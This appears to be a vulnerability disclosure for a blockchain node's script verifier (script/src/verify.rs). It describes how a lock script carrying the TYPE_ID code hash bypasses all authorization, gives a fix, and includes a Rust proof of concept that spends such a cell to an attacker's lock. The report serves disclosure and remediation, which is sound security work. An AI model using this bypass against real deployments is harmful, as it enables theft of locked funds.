### Title
TYPE_ID System Script Dispatched for Lock Groups Without Group-Type Check, Allowing Unconditional Lock Bypass — (`script/src/verify.rs`)

---

### Summary

`verify_script_group` dispatches to `TypeIdSystemScript::verify` based solely on `code_hash == TYPE_ID_CODE_HASH && hash_type == Type`, with no check on whether the group is a Lock or Type group. When a cell's **lock script** matches those two fields, the lock group has `input_indices = [i]` and `output_indices = []` (lock groups never receive output indices). Inside `TypeIdSystemScript::verify`, the only cryptographic check is gated on `input_indices.is_empty()` — which is `false` for a spending lock group — so the function returns `Ok(TYPE_ID_CYCLES)` unconditionally, bypassing the lock entirely.

---

### Finding Description

**Root cause 1 — `verify_script_group` ignores `group.group_type`:** [1](#0-0) 

The dispatch condition checks only `code_hash` and `hash_type`. There is no `group.group_type == ScriptGroupType::Type` guard, so a Lock group whose script happens to carry `TYPE_ID_CODE_HASH` + `hash_type::Type` is routed to `TypeIdSystemScript` instead of the normal VM runner.

**Root cause 2 — Lock groups structurally never have `output_indices`:** [2](#0-1) [3](#0-2) 

Only type groups receive `output_indices` entries. A lock group for a single spent cell always has `input_indices = [0]`, `output_indices = []`.

**Root cause 3 — `TypeIdSystemScript::verify` only validates when `input_indices.is_empty()`:** [4](#0-3) 

The `input_indices.len() > 1 || output_indices.len() > 1` check passes (1 ≤ 1, 0 ≤ 1). The creation-hash check at line 52 is only entered when `input_indices.is_empty()`, which is `false` here. The function falls through to `Ok(TYPE_ID_CYCLES)`.

---

### Impact Explanation

Any cell whose lock script is `Script { code_hash: TYPE_ID_CODE_HASH, hash_type: Type, args: <any 32 bytes> }` can be spent by any party in any transaction, with no signature, witness, or proof of any kind. The lock provides zero authorization. Funds or assets stored in such cells are freely claimable by anyone who constructs a valid transaction spending them.

---

### Likelihood Explanation

The TYPE_ID code hash is a well-known public constant defined in consensus. A developer who mistakenly uses TYPE_ID as a lock script (rather than a type script) — or a contract that intentionally relies on it for some uniqueness property — would silently expose all locked value. The exploit path requires no special privileges: submit a standard transaction via P2P/RPC spending the target cell.

---

### Recommendation

Add a `group.group_type == ScriptGroupType::Type` guard in `verify_script_group` (and `verify_group_with_chunk` / `verify_group_with_signal`) before dispatching to `TypeIdSystemScript`:

```rust
if group.group_type == ScriptGroupType::Type
    && group.script.code_hash() == TYPE_ID_CODE_HASH.into()
    && Into::<u8>::into(group.script.hash_type()) == Into::<u8>::into(ScriptHashType::Type)
{
    // TYPE_ID path
} else {
    self.run(group, max_cycles)
}
```

This ensures TYPE_ID verification semantics are only applied to type script groups, and any lock script that happens to carry `TYPE_ID_CODE_HASH` is executed through the normal VM (which would fail to find a binary, or execute whatever binary is referenced, rather than silently succeeding).

---

### Proof of Concept

```rust
// Construct a cell whose lock is TYPE_ID
let type_id_lock = Script::new_builder()
    .args(Bytes::from([0u8; 32].as_ref()))
    .code_hash(TYPE_ID_CODE_HASH)
    .hash_type(ScriptHashType::Type.into())
    .build();

let input_cell = CellOutputBuilder::default()
    .capacity(capacity_bytes!(1000))
    .lock(type_id_lock.clone())   // <-- TYPE_ID as lock, not type
    .build();

let input = CellInput::new(OutPoint::new(h256!("0xdead").into(), 0), 0);
let output_cell = CellOutputBuilder::default()
    .capacity(capacity_bytes!(1000))
    .lock(attacker_lock_script)   // attacker claims the funds
    .build();

let transaction = TransactionBuilder::default()
    .input(input.clone())
    .output(output_cell)
    .build();

// verify_script_group dispatches to TypeIdSystemScript for the lock group:
//   input_indices = [0], output_indices = []
//   input_indices.is_empty() == false  →  hash check skipped
//   returns Ok(TYPE_ID_CYCLES)
let result = verifier.verify(script_version, &rtx, TYPE_ID_CYCLES * 2);
assert!(result.is_ok()); // lock bypassed, funds stolen
```

### Citations

**File:** script/src/verify.rs (L427-444)
```rust
    fn verify_script_group(
        &self,
        group: &ScriptGroup,
        max_cycles: Cycle,
    ) -> Result<Cycle, ScriptError> {
        if group.script.code_hash() == TYPE_ID_CODE_HASH.into()
            && Into::<u8>::into(group.script.hash_type()) == Into::<u8>::into(ScriptHashType::Type)
        {
            let verifier = TypeIdSystemScript {
                rtx: &self.tx_data.rtx,
                script_group: group,
                max_cycles,
            };
            verifier.verify()
        } else {
            self.run(group, max_cycles)
        }
    }
```

**File:** script/src/types.rs (L722-725)
```rust
            let lock_group_entry = lock_groups
                .entry(output.calc_lock_hash())
                .or_insert_with(|| ScriptGroup::from_lock_script(&output.lock()));
            lock_group_entry.input_indices.push(i);
```

**File:** script/src/types.rs (L733-740)
```rust
        for (i, output) in rtx.transaction.outputs().into_iter().enumerate() {
            if let Some(t) = &output.type_().to_opt() {
                let type_group_entry = type_groups
                    .entry(t.calc_script_hash())
                    .or_insert_with(|| ScriptGroup::from_type_script(t));
                type_group_entry.output_indices.push(i);
            }
        }
```

**File:** script/src/type_id.rs (L42-76)
```rust
        if self.script_group.input_indices.len() > 1 || self.script_group.output_indices.len() > 1 {
            return Err(self.validation_failure(ERROR_TOO_MANY_CELLS));
        }

        // If there's only one output cell with current
        // TYPE_ID script, we are creating such a cell,
        // we also need to validate that the first argument matches
        // the hash of following items concatenated:
        // 1. First CellInput of the transaction.
        // 2. Index of the first output cell in current script group.
        if self.script_group.input_indices.is_empty() {
            let first_cell_input = self
                .rtx
                .transaction
                .inputs()
                .get(0)
                .ok_or_else(|| self.validation_failure(ERROR_ARGS))?;
            let first_output_index: u64 = self
                .script_group
                .output_indices
                .first()
                .map(|output_index| *output_index as u64)
                .ok_or_else(|| self.validation_failure(ERROR_ARGS))?;

            let mut blake2b = new_blake2b();
            blake2b.update(first_cell_input.as_slice());
            blake2b.update(&first_output_index.to_le_bytes());
            let mut ret = [0; 32];
            blake2b.finalize(&mut ret);

            if ret[..] != self.script_group.script.args().raw_data()[..] {
                return Err(self.validation_failure(ERROR_INVALID_INPUT_HASH));
            }
        }
        Ok(TYPE_ID_CYCLES)
```
